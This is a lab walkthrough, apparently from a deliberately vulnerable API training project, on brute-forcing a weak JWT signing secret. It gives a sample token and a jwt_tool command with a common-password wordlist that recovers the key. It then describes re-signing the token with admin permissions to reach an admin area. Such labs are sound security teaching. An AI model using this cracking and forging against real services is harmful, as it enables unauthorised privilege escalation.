# JWT Secret Key Brute Force

JSON Web Token is a compact mechanism used for transferring claims between two parties. These are generally represented as JSON objects and can be signed to protect the integrity of the underlying message using a Message Authentication Code (MAC) and/or encrypted. The mechanism followed by JWTs is governed by the standard RFC7519. A JSON Web Token [JWT] consists of three parts; an encoded Header, an encoded Payload and the Signature. If weak keys are used, it could be possibly found using brute force.

In this lab we are going to see how we can break the secret key used to sign JWT tokens.

### Tip
We recommend familiarizing yourself with [jwt_tool](https://github.com/ticarpi/jwt_tool) before attempting this lab.

### Solution

<details>
  <summary>View</summary>
A JWT can be taken which is given by the API :

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInBlcm1pc3Npb25zIjpbInVzZXI6cmVhZCIsInVzZXI6d3JpdGUiXSwiaWF0IjoxNjA5MDc2MjA2LCJleHAiOjE2MDkyNDkwMDYsImlzcyI6Imh0dHBzOi8vZ2l0aHViLmNvbS9zbm9vcHlzZWN1cml0eSJ9.gntpp9iRzVtYn1eZNwnvHPp-NaD15AgBDb4Ovti8r7w
```

The following [script](https://raw.githubusercontent.com/thisisrootbug/JWT_SECRET/master/jwt_secret_brute.py) can be used with the following wordlist [10k-most-common.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt)

By running the script, the secret key can be found.

```
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInBlcm1pc3Npb25zIjpbInVzZXI6cmVhZCIsInVzZXI6d3JpdGUiXSwiaWF0IjoxNjA5MDc2MjA2LCJleHAiOjE2MDkyNDkwMDYsImlzcyI6Imh0dHBzOi8vZ2l0aHViLmNvbS9zbm9vcHlzZWN1cml0eSJ9.gntpp9iRzVtYn1eZNwnvHPp-NaD15AgBDb4Ovti8r7w -C  -d ./10k-most-common.txt

...

Original JWT:

[+] access is the CORRECT key!
```

```
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "access"
```

[https://www.jwt.io/](https://www.jwt.io/) can now be used to edit the token and "user:admin" permission can now be added.

This token can now be used access the admin area.

![](./images/jwt3.png?raw=true)

![](./images/jwt4.png?raw=true)
</details>  

### Refrences 

- https://hackerone.com/reports/896649
- https://notsosecure.com/crafting-way-json-web-tokens/





